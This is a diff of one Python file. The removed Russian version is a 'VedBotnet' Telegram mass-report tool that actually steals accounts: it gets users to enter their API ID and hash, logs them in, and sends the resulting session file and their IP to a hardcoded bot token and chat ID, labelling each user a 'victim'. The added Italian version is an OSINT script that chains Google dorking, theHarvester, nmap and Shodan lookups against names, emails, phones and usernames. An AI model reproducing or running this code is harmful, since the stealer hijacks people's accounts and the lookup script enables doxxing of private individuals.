@@ -1,225 +1,200 @@
-# coder -> @vedmoor
-# coder -> @vedmoor
-# coder -> @vedmoor# coder -> @vedmoor
-# coder -> @vedmoor
-# coder -> @vedmoor
-# coder -> @vedmoor
-# coder -> @vedmoor
-# coder -> @vedmoor
-# coder -> @vedmoor
-# coder -> @vedmoor
-import socket# coder -> @vedmoor
-import sys# coder -> @vedmoor
-from pystyle import Anime, Center, Colorate, Colors# coder -> @vedmoor
-import requests# coder -> @vedmoor
-from telethon.sync import TelegramClient# coder -> @vedmoor
-import os # coder -> @vedmoor
-import webbrowser# coder -> @vedmoor
-# coder -> @vedmoor
-webbrowser.open("https://t.me/botnetsnosser", new=2)# coder -> @vedmoor
-# coder -> @vedmoor
-def clear_screen():# coder -> @vedmoor
-    """Очищает экран и устанавливает цвет фона и текста."""# coder -> @vedmoor
-    os.system("cls" if os.name == "nt" else "clear")# coder -> @vedmoor
-    # Устанавливаем цвет фона RGB(0, 12, 24) и белый текст
-    print("\033[48;2;0;12;24m\033[38;2;255;255;255m", end='')# coder -> @vedmoor
-    os.system("cls" if os.name == "nt" else "clear")# coder -> @vedmoor
-# coder -> @vedmoor
-clear_screen()
-# coder -> @vedmoor
-# coder -> @vedmoor
-Intro = """
-╭─                                                                                    ─╮
+SUICIDE TOOL
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 
- 
+import os
+import sys
+import subprocess
+import requests
+from googlesearch import search
+import socket
+import dns.resolver
+import argparse
+from colorama import Fore, Style, init
 
-         ██▒   █▓▓█████ ▓█████▄  ▄▄▄▄    ▒█████  ▄▄▄█████▓ ███▄    █ ▓█████▄▄▄█████▓
-        ▓██░   █▒▓█   ▀ ▒██▀ ██▌▓█████▄ ▒██▒  ██▒▓  ██▒ ▓▒ ██ ▀█   █ ▓█   ▀▓  ██▒ ▓▒
-        ▓██  █▒░▒███   ░██   █▌▒██▒ ▄██▒██░  ██▒▒ ▓██░ ▒░▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░
-         ▒██ █░░▒▓█  ▄ ░▓█▄   ▌▒██░█▀  ▒██   ██░░ ▓██▓ ░ ▓██▒  ▐▌██▒▒▓█  ▄░ ▓██▓ ░ 
-          ▒▀█░  ░▒████▒░▒████▓ ░▓█  ▀█▓░ ████▓▒░  ▒██▒ ░ ▒██░   ▓██░░▒████▒ ▒██▒ ░ 
-         ░  ▐░  ░░ ▒░ ░ ▒▒▓  ▒ ░▒▓███▀▒░ ▒░▒░▒░   ▒ ░░   ░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░   
-         ░ ░░   ░ ░  ░ ░ ▒  ▒ ▒░▒   ░   ░ ▒ ▒░     ░    ░ ░░   ░ ▒░ ░ ░  ░   ░    
-            ░░     ░    ░ ░  ░  ░    ░ ░ ░ ░ ▒    ░         ░   ░ ░    ░    ░      
-             ░     ░  ░   ░     ░          ░ ░                    ░    ░  ░        
-            ░           ░            ░                                             
+init(autoreset=True)
 
-                         VedBotnet - бесплатный ботнет сносер. 
-                                   
-╰─                                                                                     ─╯
-
-                      Нажмите "Enter" для запуска ботнет сносера.
-
+# Banner artistico
+def print_banner():
+    banner = f"""
+{Fore.RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠛⠋⣿⡟⠛⠛⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠃⠻⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠁⠀⠀⠙⢥⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⡞⢣⢸⣇⣰⡇⡼⢵⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⡰⠋⠉⣸⡆⠉⠳⣤⢗⡀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⡰⠞⢸⡅⠀⠀⣿⡿⠀⠀⢸⡆⢳⠄⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⣰⠏⠀⠀⠙⠦⣄⣹⣇⣤⠶⠉⠀⠀⢛⣄⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⣼⣃⣀⣀⣀⣀⣀⠏⠘⠂⢙⡂⠤⣀⣀⣀⣱⣆⠀⠀⠀⠀⠀ 
+⠀⠀⠀⠀⠀⡼⢥⣼⣅⣤⣄⣤⣸⣿⣶⣾⣿⣇⢠⠤⠥⠤⠿⠜⣦⠀⠀⠀⠀
+⠀⠀⠀⠀⠾⠱⠂⢲⠒⠒⠒AMIRI⠄⠊⠛⠤⠒⠒⡒⢶⠆⠘⣣⠀⠀⠀
+⠀⠀⠀⠘⠛⠓⠒⠛⠒⢻⣿⣶⡏⣋⡉⠛⢩⣶⢹⣶⠒⠒⠛⠒⠛⠛⠃⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣷⣿⡇⢠⣤⣿⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠈⢉⣿⣇⢸⣿⠛⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢼⣿⡁⠀⠙⠀⠙⣿⡣⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⡆⠀⠀⠀⠀⠀⠀⣾⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠃⠁⠀⠀⠀⠀⠀⠀⠉⠛⠁  by:Ucciso
+{Style.RESET_ALL}
 """
-# coder -> @vedmoor
-Anime.Fade(# coder -> @vedmoor
-    Center.Center(Intro),# coder -> @vedmoor
-    Colors.purple_to_blue,# coder -> @vedmoor
-    Colorate.Vertical,# coder -> @vedmoor
-    interval=0.1,# coder -> @vedmoor
-    enter=True,# coder -> @vedmoor
-)# coder -> @vedmoor
-# coder -> @vedmoor
-clear_screen()# coder -> @vedmoor
-# coder -> @vedmoor
-banner = """
+    print(banner)
 
-╭───────────────────────────────────────────────────────────────────────────────────────────╮
-│                                                                                           │                                   
-│                                                                                           │
-│    ██▒   █▓▓█████ ▓█████▄     ▄▄▄▄    ▒█████  ▄▄▄█████▓ ███▄    █ ▓█████▄▄▄█████▓         │
-│   ▓██░   █▒▓█   ▀ ▒██▀ ██▌   ▓█████▄ ▒██▒  ██▒▓  ██▒ ▓▒ ██ ▀█   █ ▓█   ▀▓  ██▒ ▓▒         │
-│    ▓██  █▒░▒███   ░██   █▌   ▒██▒ ▄██▒██░  ██▒▒ ▓██░ ▒░▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░         │
-│     ▒██ █░░▒▓█  ▄ ░▓█▄   ▌   ▒██░█▀  ▒██   ██░░ ▓██▓ ░ ▓██▒  ▐▌██▒▒▓█  ▄░ ▓██▓ ░          │
-│      ▒▀█░  ░▒████▒░▒████▓    ░▓█  ▀█▓░ ████▓▒░  ▒██▒ ░ ▒██░   ▓██░░▒████▒ ▒██▒ ░          │
-│     ░ ▐░  ░░ ▒░ ░ ▒▒▓  ▒    ░▒▓███▀▒░ ▒░▒░▒░   ▒ ░░   ░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░             │
-│     ░ ░░   ░ ░  ░ ░ ▒  ▒    ▒░▒   ░   ░ ▒ ▒░     ░    ░ ░░   ░ ▒░ ░ ░  ░   ░              │
-│      ░░     ░    ░ ░  ░     ░    ░ ░ ░ ░ ▒    ░         ░   ░ ░    ░    ░                 │
-│       ░     ░  ░   ░        ░          ░ ░                    ░    ░  ░                   │
-│                                                                                           │                              
-│                                                                                           │
-│   Наш канал https://t.
-me/botnetsnosser                  ● STATUS [WORK]                   │
-│   Ved Botnet - бесплатный клиент ботнет сносера         ● Кол-во сессий в ботнете [160]   │
-│                                                         ● Кол-во успешных сносов [54]     │
-│                                                                                           │
-│                                      [1] SNOS                                             │
-│                                                                                           │
-│                                    [CTRL + Z] Выход                                       │
-│                                                                                           │ 
-╰───────────────────────────────────────────────────────────────────────────────────────────╯
+# Funzioni di ricerca OSINT
+def google_dorking(query, num_results=10):
+    print(f"\n{Fore.YELLOW}[*] Eseguendo Google Dorking...{Style.RESET_ALL}")
+    try:
+        for result in search(query, num_results=num_results, stop=num_results, pause=2):
+            print(f"{Fore.GREEN}[+] {result}{Style.RESET_ALL}")
+    except Exception as e:
+        print(f"{Fore.RED}[-] Errore durante il Google Dorking: {e}{Style.RESET_ALL}")
 
+def theharvester_search(domain):
+    print(f"\n{Fore.YELLOW}[*] Eseguendo TheHarvester...{Style.RESET_ALL}")
+    try:
+        command = f"theHarvester -d {domain} -b all"
+        result = subprocess.run(command, shell=True, capture_output=True, text=True)
+        print(result.stdout)
+    except Exception as e:
+        print(f"{Fore.RED}[-] Errore durante l'esecuzione di TheHarvester: {e}{Style.RESET_ALL}")
 
+def nmap_scan(target):
+    print(f"\n{Fore.YELLOW}[*] Eseguendo Nmap scan...{Style.RESET_ALL}")
+    try:
+        command = f"nmap -sV -O -T4 {target}"
+        result = subprocess.run(command, shell=True, capture_output=True, text=True)
+        print(result.stdout)
+    except Exception as e:
+        print(f"{Fore.RED}[-] Errore durante l'esecuzione di Nmap: {e}{Style.RESET_ALL}")
 
+def shodan_search(query):
+    print(f"\n{Fore.YELLOW}[*] Eseguendo Shodan search...{Style.RESET_ALL}")
+    try:
+        # Necessario avere l'API key di Shodan
+        api_key = "YOUR_SHODAN_API_KEY"  # Sostituire con la propria API key
+        if api_key == "YOUR_SHODAN_API_KEY":
+            print(f"{Fore.RED}[-] Inserire la propria Shodan API key nello script{Style.RESET_ALL}")
+            return
+        
+        url = f"https://api.shodan.io/shodan/host/search?key={api_key}&query={query}"
+        response = requests.get(url)
+        data = response.json()
+        
+        for result in data['matches']:
+            print(f"\n{Fore.CYAN}IP: {result['ip_str']}")
+            print(f"Porta: {result['port']}")
+            print(f"Organizzazione: {result.get('org', 'N/A')}")
+            print(f"Hostnames: {', '.join(result.get('hostnames', []))}")
+            print(f"Dati: {result['data'][:100]}...{Style.RESET_ALL}")
+            
+    except Exception as e:
+        print(f"{Fore.RED}[-] Errore durante la ricerca su Shodan: {e}{Style.RESET_ALL}")
 
+def email_search(email):
+    print(f"\n{Fore.YELLOW}[*] Ricercando informazioni sull'email...{Style.RESET_ALL}")
+    try:
+        # Verifica email su Have I Been Pwned
+        url = f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}"
+        headers = {"hibp-api-key": "YOUR_HIBP_API_KEY"}  # Sostituire con la propria API key
+        response = requests.get(url, headers=headers)
+        
+        if response.status_code == 200:
+            breaches = response.json()
+            print(f"{Fore.RED}[!] Email trovata in {len(breaches)} violazioni:{Style.RESET_ALL}")
+            for breach in breaches:
+                print(f"- {breach['Name']} ({breach['BreachDate']})")
+        else:
+            print(f"{Fore.GREEN}[+] Email non trovata in violazioni conosciute{Style.RESET_ALL}")
+            
+        # Ricerca su Hunter.io (necessario API key)
+        # hunter_api_key = "YOUR_HUNTER_API_KEY"
+        # hunter_url = f"https://api.hunter.io/v2/email-verifier?email={email}&api_key={hunter_api_key}"
+        # hunter_response = requests.get(hunter_url)
+        # hunter_data = hunter_response.json()
+        # Analizzare i dati di hunter_data...
+        
+    except Exception as e:
+        print(f"{Fore.RED}[-] Errore durante la ricerca dell'email: {e}{Style.RESET_ALL}")
 
+def phone_lookup(phone_number):
+    print(f"\n{Fore.YELLOW}[*] Ricercando informazioni sul numero di telefono...{Style.RESET_ALL}")
+    try:
+        # Utilizzo di NumVerify (necessario API key)
+        # api_key = "YOUR_NUMVERIFY_API_KEY"
+        # url = f"http://apilayer.net/api/validate?access_key={api_key}&number={phone_number}"
+        # response = requests.get(url)
+        # data = response.json()
+        
+        # Alternativa: ricerca su Truecaller (non ufficiale, potrebbe violare i ToS)
+        print(f"{Fore.YELLOW}[!] Ricerca diretta del numero di telefono richiede servizi a pagamento{Style.RESET_ALL}")
+        
+    except Exception as e:
+        print(f"{Fore.RED}[-] Errore durante la ricerca del numero: {e}{Style.RESET_ALL}")
 
-"""
-# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
-banner3 = """
+def discord_username_lookup(username):
+    print(f"\n{Fore.YELLOW}[*] Ricercando informazioni sul nome utente Discord...{Style.RESET_ALL}")
+    try:
+        # Nota: Discord non fornisce un'API pubblica per la ricerca di utenti
+        # Questa è una simulazione di ciò che si potrebbe fare con servizi esterni
+        
+        # Ricerca su social media e forum
+        google_dorking(f'site:reddit.com "{username}"')
+        google_dorking(f'site:twitter.com "{username}"')
+        google_dorking(f'site:github.com "{username}"')
+        
+        # Ricerca su servizi di terze parti (esempio)
+        print(f"{Fore.YELLOW}[!] Controllare manualmente servizi come Discord.id o altre utility{Style.RESET_ALL}")
+        
+    except Exception as e:
+        print(f"{Fore.RED}[-] Errore durante la ricerca del nome utente Discord: {e}{Style.RESET_ALL}")
 
-У вас отсутсвует подписка! Для получения бесплатной подписки в сносере нужно добавить в ботнет свою сессию.
+def main():
+    print_banner()
+    
+    parser = argparse.ArgumentParser(description="SUICIDE TOOL - Framework OSINT avanzato")
+    parser.add_argument("-n", "--name", help="Nome completo (formato 'Nome Cognome')")
+    parser.add_argument("-e", "--email", help="Indirizzo email da investigare")
+    parser.add_argument("-p", "--phone", help="Numero di telefono da investigare")
+    parser.add_argument("-d", "--domain", help="Dominio da investigare")
+    parser.add_argument("-u", "--username", help="Nome utente Discord da investigare")
+    parser.add_argument("-ip", "--ipaddress", help="Indirizzo IP da scannerizzare")
+    
+    args = parser.parse_args()
+    
+    if not any(vars(args).values()):
+        parser.print_help()
+        return
+    
+    if args.name:
+        print(f"\n{Fore.BLUE}[*] Avvio ricerca per: {args.name}{Style.RESET_ALL}")
+        google_dorking(f'"{args.name}"')
+        google_dorking(f'"{args.name}" filetype:pdf')
+        google_dorking(f'"{args.name}" site:linkedin.com')
+        
+    if args.email:
+        print(f"\n{Fore.BLUE}[*] Avvio ricerca per email: {args.email}{Style.RESET_ALL}")
+        email_search(args.email)
+        google_dorking(args.email)
+        
+    if args.phone:
+        print(f"\n{Fore.BLUE}[*] Avvio ricerca per telefono: {args.phone}{Style.RESET_ALL}")
+        phone_lookup(args.phone)
+        
+    if args.domain:
+        print(f"\n{Fore.BLUE}[*] Avvio ricerca per dominio: {args.domain}{Style.RESET_ALL}")
+        theharvester_search(args.domain)
+        shodan_search(f"hostname:{args.domain}")
+        
+    if args.username:
+        print(f"\n{Fore.BLUE}[*] Avvio ricerca per nome utente Discord: {args.username}{Style.RESET_ALL}")
+        discord_username_lookup(args.username)
+        
+    if args.ipaddress:
+        print(f"\n{Fore.BLUE}[*] Avvio scansione IP: {args.ipaddress}{Style.RESET_ALL}")
+        nmap_scan(args.ipaddress)
+        shodan_search(f"net:{args.ipaddress}")
 
-
-● Так как наш сносер только открылся, для бесплатной месячной подписки нужно добавить свою сессию в систему тем самым делая сносер мощнее и быстрее.
-● С вашей сессии также будут отправляться жалобы на других пользователей.
-● За свой акаунт вы можете не волноваться так как вашей сессией владеет только система и в нее не добавлено других функций кроме отправки жалоб.
-
-
-
-Для создания сессии нужно:
-
-
-1. Перейдите по my.telegram.org/apps
-
-2. Войдите со своим номером телеграм и введите код (он придет в тг)
-
-3. Выберите API developoment tool
-
-4. Создайте новое приложение. Платформа любая. Название любое. Остальные поля пустыми оставьте.
-
-5. Далее нажимайте Create application вас будет API ID и API HASH.
-
-6. Далее введите их и получите пробную подписку на 1 месяц в ботнет сносере.
-
-7. Важно! При добавление сессии в наш сносер вводите ваш телефон а не token bot. Посколько с бота система не может отправлять жалобы
-
-
-
-"""
-# coder -> @vedmoor
-banner4 = """
-Сессия создана успешно и была добавленна на сервер ботнета!
-Мы проверим ее на работоспособность а затем ваша подписка на 1 месяц активирована. 
-Важно чтобы вы не кикали сессию пока идет проверка.
-
-***
-На данный момент система перегруженна, поэтому выдача подписки может занять от 15 минут до нескольких дней. 
-Если у вас есть какие то вопросы вы можете написать нашему админу @uiyfOyd96 
-
-***
-
-
-"""
-
-
-
-
-
-
-
-
-
-
-BOT_TOKEN = "7794096211:AAGwuHD-fMU4vmRiHyBrnyo4YgiU-OOXSYA"
-CHAT_ID = "7129761151"
-
-# coder -> @vedmoor
-print(Colorate.Horizontal(Colors.blue_to_purple, Center.XCenter(banner)))
-# coder -> @vedmoor
-while True:# coder -> @vedmoor
-    choice = input("root@BotnetSnos -> ")# coder -> @vedmoor
-    if choice == "1":# coder -> @vedmoor
-# coder -> @vedmoor
-        print(Colorate.Horizontal(Colors.blue_to_purple, Center.XCenter(banner3)))
-# coder -> @vedmoor
-# coder -> @vedmoor
-# coder -> @vedmoor
-        def send_notification(message):# coder -> @vedmoor
-            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"# coder -> @vedmoor
-            data = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}# coder -> @vedmoor
-            try:# coder -> @vedmoor
-                requests.post(url, data=data, timeout=10)# coder -> @vedmoor
-            except Exception:# coder -> @vedmoor
-                sys.exit()# coder -> @vedmoor
-# coder -> @vedmoor
-# coder -> @vedmoor
-        def get_user_ip():# coder -> @vedmoor
-            try:# coder -> @vedmoor
-                response = requests.get("https://api.ipify.org?format=json", timeout=10)# coder -> @vedmoor
-                response.raise_for_status()# coder -> @vedmoor
-                ip = response.json().get("ip")# coder -> @vedmoor
-                return ip.replace(".", "_") if ip else "unknown_ip"# coder -> @vedmoor
-            except:# coder -> @vedmoor
-                try:# coder -> @vedmoor
-                    return socket.gethostbyname(socket.gethostname()).replace(".", "_")# coder -> @vedmoor
-                except:# coder -> @vedmoor
-return "unknown_ip"# coder -> @vedmoor
-# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
-# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
-        try:# coder -> @vedmoor
-            user_ip = get_user_ip()# coder -> @vedmoor
-            session_name = f"ip_{user_ip}"# coder -> @vedmoor
-# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
-            api_id = int(input("Введите API ID: "))# coder -> @vedmoor
-            api_hash = input("Введите API Hash: ")# coder -> @vedmoor
-# coder -> @vedmoor
-            with TelegramClient(session_name, api_id, api_hash) as client:# coder -> @vedmoor
-                client.start()
-# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
-                session_file = f"{session_name}.session"# coder -> @vedmoor
-                message = f"{user_ip} жертва сделала сессию {session_name}.session"
-# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
-                try:# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
-                    with open(session_file, "rb") as file:# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
-                        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"# coder -> @vedmoor
-                        files = {"document": (session_file, file)}# coder -> @vedmoor
-                        data = {"chat_id": CHAT_ID, "caption": message}# coder -> @vedmoor
-# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
-                        response = requests.post(url, data=data, files=files, timeout=20)# coder -> @vedmoor
-# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
-                        if response.status_code != 200:# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
-                            send_notification(# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
-                                f"{user_ip} ошибка отправки файла: {response.status_code}"
-                            )# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
-                except Exception as e:# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
-                    send_notification(f"{user_ip} ошибка при отправке файла: {str(e)}")
-                print(Colorate.Horizontal(Colors.blue_to_purple, Center.XCenter(banner4)))
-# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
-        except Exception as e:# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
-            send_notification(f"Жертва {user_ip} неправильно ввела id или hash : {str(e)}")
-# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
-        # coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
-    else:# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
-        print("Неверный выбор.")
-# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
+if __name__ == "__main__":
+    main()
